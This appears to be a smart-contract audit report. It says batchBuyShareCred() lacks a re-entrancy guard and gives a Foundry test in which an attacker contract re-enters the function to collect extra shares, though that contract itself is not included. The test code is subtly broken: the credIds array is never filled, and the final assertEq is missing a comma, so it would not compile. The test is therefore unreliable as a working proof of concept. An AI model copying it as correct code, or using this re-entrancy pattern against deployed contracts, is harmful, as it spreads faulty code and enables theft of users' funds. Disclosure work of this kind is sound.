# Vulnerability details

## Impact
Re-entrancy is possible on ```batchBuyShareCred()``` as there is no re-entrancy guard on the function itself.

## Proof of Concept
Paste the test and BatchReentrancyAttacker contract into ```Cred.t.sol```

```solidity
    function testNormalVsReentrancyAttack() public {
        // Create multiple creds
        _createCred("BASIC", "SIGNATURE", bytes32(0));
        _createCred("BASIC", "SIGNATURE", bytes32(0));

        // Fund the contract (simulating other users' activity)
        vm.deal(address(cred), 10 ether);

        // Normal user setup
        address normalUser = address(0x1234);
        vm.deal(normalUser, 5 ether);

        // Attacker setup
        BatchReentrancyAttacker attacker = new BatchReentrancyAttacker(address(cred));
        vm.deal(address(attacker), 5 ether);

        // Prepare parameters
        uint256[] memory credIds = new uint256[](2);
        uint256[] memory amounts = new uint256[](2);
        uint256[] memory maxPrices = new uint256[](2);

        amounts[0] = 1;
        amounts[1] = 1;
        maxPrices[0] = type(uint256).max;
        maxPrices[1] = type(uint256).max;

        // Normal user interaction
        vm.startPrank(normalUser);
        cred.batchBuyShareCred{value: 3 ether}(credIds, amounts, maxPrices, normalUser);
        vm.stopPrank();

        // Check normal user's shares
        uint256 normalUserShares = cred.getShareNumber(1, normalUser) + cred.getShareNumber(2, normalUser);

        // Attacker interaction
        attacker.attack{value: 3 ether}(credIds, amounts, maxPrices);

        // Check attacker's shares
        uint256 attackerShares = cred.getShareNumber(1, address(attacker)) + cred.getShareNumber(2, address(attacker));

        // Assertions
        assertEq(normalUserShares, 2, "Normal user acquired 2 shares");
        assertEq(attackerShares 12, "Attacker acquired 12 shares after reentering 5 more times");
    }
```
